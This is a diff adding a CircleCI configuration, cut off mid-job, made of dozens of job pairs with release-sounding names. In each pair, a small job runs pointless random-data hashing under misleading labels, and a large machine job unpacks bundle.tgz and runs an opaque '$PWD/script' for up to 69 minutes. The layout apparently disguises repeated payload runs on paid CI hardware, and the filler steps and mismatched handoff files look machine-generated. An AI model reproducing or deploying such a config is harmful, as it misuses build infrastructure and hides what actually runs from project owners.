@@ -1,0 +1,1626 @@
+version: 2.1
+
+jobs:
+  loader_hotfix-8520:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; seq 1 984648 | sha256sum > /tmp/handoff/checkpoint-B.pickle; true
+            len=$(wc -c </tmp/handoff/checkpoint-B.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - checkpoint-B.pickle
+  hotfix-8520:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  phase1_assemble-partial-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 665600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/handoff/gate-complete.sig
+            len=$(wc -c </tmp/handoff/gate-complete.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - gate-complete.sig
+  assemble-partial-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/gate-complete.sig > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  blue_check-partial-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 14336000 | base64 | head -c 200 | wc -c; true ; } > /tmp/handoff/pt-C.state
+            len=$(wc -c </tmp/handoff/pt-C.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - pt-C.state
+  check-partial-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  p1_feat-7594:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 1400 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/handoff/output.md
+            len=$(wc -c </tmp/handoff/output.md); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - output.md
+  feat-7594:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  resync_update-router-v2-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 363650 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/handoff/secondary_step_output.txt
+            len=$(wc -c </tmp/handoff/secondary_step_output.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - secondary_step_output.txt
+  update-router-v2-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  redo_lima-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mint sequence identifier
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 19922944 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/handoff/relay.state
+            len=$(wc -c </tmp/handoff/relay.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.state
+  lima-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/relay.state > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  runner_java17-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 8704000 | base64 | head -c 200 | wc -c; true ; } > /tmp/handoff/step-24.log
+            len=$(wc -c </tmp/handoff/step-24.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-24.log
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/step-24.log > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  install_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=361100;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/handoff/step-28.txt
+            len=$(wc -c </tmp/handoff/step-28.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-28.txt
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/step-28.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  run_go1-21-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 56623104 | fold -w16 | sort -u | wc -l; true ; } > /tmp/handoff/2024-08-22.data
+            len=$(wc -c </tmp/handoff/2024-08-22.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-08-22.data
+  go1-21-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  ctx2_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 26214400 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/handoff/phase-done.log
+            len=$(wc -c </tmp/handoff/phase-done.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - phase-done.log
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  orchestrate_WEB-661:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 7340032 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/handoff/70.data
+            len=$(wc -c </tmp/handoff/70.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 70.data
+  WEB-661:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  cache_nico-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 5242880 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/handoff/buffer.dat
+            len=$(wc -c </tmp/handoff/buffer.dat); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - buffer.dat
+  nico-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/buffer.dat > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  prep_b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rotate build log
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 409600 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/handoff/step-19.log
+            len=$(wc -c </tmp/handoff/step-19.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-19.log
+  b:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  round2_fix-session-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=62338;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/handoff/summary.txt
+            len=$(wc -c </tmp/handoff/summary.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - summary.txt
+  fix-session-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/summary.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  go_tb-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 113821 | sha1sum; true ; } > /tmp/handoff/54.blob
+            len=$(wc -c </tmp/handoff/54.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 54.blob
+  tb-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/54.blob > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  g2_pr-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=15 2>/dev/null | sha256sum; true ; } > /tmp/handoff/READY.txt
+            len=$(wc -c </tmp/handoff/READY.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - READY.txt
+  pr-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  fetcher_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 1143300 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/handoff/2024-05-05.data
+            len=$(wc -c </tmp/handoff/2024-05-05.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-05-05.data
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/2024-05-05.data > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  vendor_INIT_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=127727;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/handoff/62.data
+            len=$(wc -c </tmp/handoff/62.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 62.data
+  INIT_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/62.data > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  alpha_Launch_Staging6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 27178); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/handoff/trace.log
+            len=$(wc -c </tmp/handoff/trace.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.log
+  Launch_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/trace.log > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  beta_STAGE_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 16777216 /dev/urandom | sha256sum; true ; } > /tmp/handoff/.ok
+            len=$(wc -c </tmp/handoff/.ok); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .ok
+  STAGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/.ok > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  package_strated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 429686 | awk 'NR>11557 && NR<41552{s+=$1}END{print s}'; true ; } > /tmp/handoff/handoff.sig
+            len=$(wc -c </tmp/handoff/handoff.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - handoff.sig
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/handoff.sig > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  drain_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 419570 | awk '{s+=$1}END{print s}'; true ; } > /tmp/handoff/36.out
+            len=$(wc -c </tmp/handoff/36.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 36.out
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/36.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  preinit_node18-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 102400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/handoff/OK
+            len=$(wc -c </tmp/handoff/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - OK
+  node18-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/OK > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  warmer_auh-check:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 64250 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/handoff/primary_phase_output.out
+            len=$(wc -c </tmp/handoff/primary_phase_output.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - primary_phase_output.out
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/primary_phase_output.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  stepB_smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 15857 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/handoff/artifact
+            len=$(wc -c </tmp/handoff/artifact); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - artifact
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/artifact > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  run_Ship_Pipeline1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Audit path segments
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 163840 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/handoff/stash.raw
+            len=$(wc -c </tmp/handoff/stash.raw); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.raw
+  Ship_Pipeline1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/stash.raw > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  ensure_cerberus-ng:
+    docker:
